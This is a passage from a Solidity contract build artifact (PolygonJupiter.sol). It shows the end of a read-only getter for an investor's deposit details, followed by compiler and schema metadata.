_tarif,\n            uint256 _amount,\n            uint40 _time\n        )\n    {\n        Investor storage investor = investors[msg.sender];\n\n        require(\n            _index < investor.deposits.length,\n            \"Index out of range of your deposits\"\n        );\n\n        return (\n            investor.deposits[_index].tarif,\n            investor.deposits[_index].amount,\n            investor.deposits[_index].time\n        );\n    }\n}\n",
  "sourcePath": "/Users/rahulgupta/Workspace/polygon-SC/contracts/PolygonJupiter.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.0+commit.c7dfd78e.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2021-12-25T12:43:25.051Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}